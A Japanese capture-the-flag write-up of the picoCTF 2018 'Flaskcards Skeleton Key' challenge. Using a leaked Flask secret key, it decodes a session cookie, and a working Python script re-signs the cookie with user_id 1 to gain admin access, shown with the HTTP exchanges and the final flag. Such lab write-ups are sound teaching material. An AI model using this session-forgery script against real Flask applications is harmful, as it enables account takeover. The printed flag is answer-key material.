# Flaskcards Skeleton Key

## Solve
```
Nice! You found out they were sending the Secret_key: 73e1f2c96e364f0cc3371c31927ed156. 
Now, can you find a way to log in as admin? 
http://2018shell.picoctf.com:12261 (link).
```

## Hint
```
What can you do with a flask Secret_Key?
The database still reverts every 2 hours
```

<br>

## Solution

![1](https://user-images.githubusercontent.com/47602064/83868634-366f7b80-a766-11ea-9d24-77de56fd2239.png)

問題のページに移動するとloginが出来る`Flask`が関係してそうなページが表示されました。

今回は問題文に`Secret_key: 73e1f2c96e364f0cc3371c31927ed156`とあるのでこれを使うと思われます。

そして`flask`のフレームワークで動いていることも考えられます。

まずはアカウントを作ってloginをしてみます。

![2](https://user-images.githubusercontent.com/47602064/83874469-763b6080-a770-11ea-9c52-9d736f03b24f.png)

loginは出来ました。

ここでloginする時の通信を見てみると以下のようになっていました。

```http
HTTP/1.1 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 219
Location: http://2018shell.picoctf.com:12261/index
Vary: Cookie
Set-Cookie: session=.eJwlz01qAzEMQOG7eJ2FJEu2nMsEWT-0FFqYSVald89AD_DBe7_tUUeeH-3-PF55a4_PaPfGlWVJOKMEMwfuxGFLREF8TDaaGJlsgHvpSIfqYqy-e6RSgHZF3KK-YkyACyIzWnV1hmXiC7MrgIqYzG2uFrTSuLMMlHZrfh71eP585ffV40lDKyo2Vvdi4JhkTimLnRSozKsWXu515vE_QbP9vQHyWj98.Eb45Ug.5fyQ-BypokTjBFbhs8mhvWPZqNc; HttpOnly; Path=/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/index">/index</a>.  If not click the link.
```

今回は`cookie`に`session`が付いていました。

今回は先頭に`.`があるので`zlib`が使用されていることがわかります。

なので試しにこれを解凍してデコードし、中身を見てみます。

```python
#!/usr/bin/python

import base64, zlib

session_cookie = '.eJwlz01qAzEMQOG7eJ2FJEu2nMsEWT-0FFqYSVald89AD_DBe7_tUUeeH-3-PF55a4_PaPfGlWVJOKMEMwfuxGFLREF8TDaaGJlsgHvpSIfqYqy-e6RSgHZF3KK-YkyACyIzWnV1hmXiC7MrgIqYzG2uFrTSuLMMlHZrfh71eP585ffV40lDKyo2Vvdi4JhkTimLnRSozKsWXu515vE_QbP9vQHyWj98.Eb45Rw.2E7fsQB1cpukW7JcF1g6EtrOSN0'
data = session_cookie.split('.')[1]
data += b'=' * ((4 - len(data) % 4))
data = base64.urlsafe_b64decode(data)
data = zlib.decompress(data)
print(data)
```

```
$ python solve1.py 
{"_fresh":true,"_id":"4fefae217df51ee61be16a955805c674a271dee4a01b986ec0f35a48cb3de82d083811b58c9d67005581441af38c409a5c91e3800855a57bac8ad29ea4345615","csrf_token":"ce268fdfdb1f3cf404d72ac2e594c2802facff91","user_id":"27"}
```

これを綺麗に並べると以下のようになります。

```
{
   "_fresh":true,
   "_id":"4fefae217df51ee61be16a955805c674a271dee4a01b986ec0f35a48cb3de82d083811b58c9d67005581441af38c409a5c91e3800855a57bac8ad29ea4345615",
   "csrf_token":"ce268fdfdb1f3cf404d72ac2e594c2802facff91",
   "user_id":"27"
}
```

これを見る限り`JSON`形式で入っていることがわかります。

そして`user_id`というのがあることもわかります。

このIDが`admin`になれば、良さそうです。

おそらく`0`か`1`が`admin`の`user_id`と推測されます。

　最終的には`1`が`admin`でした。

<br>

今回は`FLASK`が使われていることがわかります。

なのでそれを利用して`session`を`admin`である`1`を含むように生成させます。

問題文にあった`Secret_key`を使います。

```python
#!/usr/bin/env python3

import zlib
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import base64_decode, URLSafeTimedSerializer

secret_key = '73e1f2c96e364f0cc3371c31927ed156'
user_cookie = '.eJwlz01qAzEMQOG7eJ2FJEu2nMsEWT-0FFqYSVald89AD_DBe7_tUUeeH-3-PF55a4_PaPfGlWVJOKMEMwfuxGFLREF8TDaaGJlsgHvpSIfqYqy-e6RSgHZF3KK-YkyACyIzWnV1hmXiC7MrgIqYzG2uFrTSuLMMlHZrfh71eP585ffV40lDKyo2Vvdi4JhkTimLnRSozKsWXu515vE_QbP9vQHyWj98.Eb45Rw.2E7fsQB1cpukW7JcF1g6EtrOSN0'

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    def get_signing_serializer(self, secret_key):
        signer_kwargs = {
            'key_derivation': self.key_derivation,
            'digest_method': self.digest_method
        }
        return URLSafeTimedSerializer(
            secret_key,
            salt=self.salt,
            serializer=self.serializer,
            signer_kwargs=signer_kwargs
        )

class FlaskSessionCookieManager:
    @classmethod
    def decode(cls, secret_key, cookie):
        sscsi = SimpleSecureCookieSessionInterface()
        signingSerializer = sscsi.get_signing_serializer(secret_key)
        return signingSerializer.loads(cookie)

    @classmethod
    def encode(cls, secret_key, session):
        sscsi = SimpleSecureCookieSessionInterface()
        signingSerializer = sscsi.get_signing_serializer(secret_key)
        return signingSerializer.dumps(session)

# main
user_session = FlaskSessionCookieManager.decode(secret_key, user_cookie)
print(user_session)
admin_session = user_session
admin_session['user_id'] = '1'
print(admin_session)
print()
admin_cookie = FlaskSessionCookieManager.encode(secret_key, admin_session)
print(admin_cookie)
```




```
$ python3 solve2.py 
{'_fresh': True, '_id': '4fefae217df51ee61be16a955805c674a271dee4a01b986ec0f35a48cb3de82d083811b58c9d67005581441af38c409a5c91e3800855a57bac8ad29ea4345615', 'csrf_token': 'ce268fdfdb1f3cf404d72ac2e594c2802facff91', 'user_id': '27'}
{'_fresh': True, '_id': '4fefae217df51ee61be16a955805c674a271dee4a01b986ec0f35a48cb3de82d083811b58c9d67005581441af38c409a5c91e3800855a57bac8ad29ea4345615', 'csrf_token': 'ce268fdfdb1f3cf404d72ac2e594c2802facff91', 'user_id': '1'}

.eJwlz12qAjEMQOG99NmHpE3a1M0MaX5QBIUZfbrcvTvgAj44569sucdxK9f3_olL2e5eroUyUqPi8GSM6LgCu05mAbY-SOtAjyAFXFN6GGRjJbHVPKQ6SBPExWLT-wA4IRKhZhMjmMo2MZoACLPyWGqiXmcoNeKOXC7Fjj239-sRz7PHonZJT1-YzZKAfFS1GjzJqkBNtcyJp_scsf8msPx_AbMMP0Q.Eb53rg.2wzs8V7hkmPev8P4TNy5VXUu4YM
```

これで上手く`admin`の`user_id:1`を含む`session`が生成できました。

なのでこれを`/admin`に送ってアクセスしてみます。

```http
GET /admin HTTP/1.1
Host: 2018shell.picoctf.com:12261

Referer: http://2018shell.picoctf.com:12261/index
Cookie: _ga=GA1.2.1326079095.1591175644; session=.eJwlz12qAjEMQOG99NmHpE3a1M0MaX5QBIUZfbrcvTvgAj44569sucdxK9f3_olL2e5eroUyUqPi8GSM6LgCu05mAbY-SOtAjyAFXFN6GGRjJbHVPKQ6SBPExWLT-wA4IRKhZhMjmMo2MZoACLPyWGqiXmcoNeKOXC7Fjj239-sRz7PHonZJT1-YzZKAfFS1GjzJqkBNtcyJp_scsf8msPx_AbMMP0Q.Eb53rg.2wzs8V7hkmPev8P4TNy5VXUu4YM

```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 12228
Vary: Cookie

<html>
<!DOCTYPE html>
			
<h1 class="page-header text-capitalize">Welcome admin</h1>

		<p> Your flag is: picoCTF{1_id_to_rule_them_all_8470d1c9} </p>
	
```

すると上手く`admin`でアクセス出来て、flagが表示されました。

![3](https://user-images.githubusercontent.com/47602064/83969538-8a679500-a90b-11ea-9d72-adaec0e33369.png)


<br><br>

## FLAG: picoCTF{1_id_to_rule_them_all_8470d1c9} 
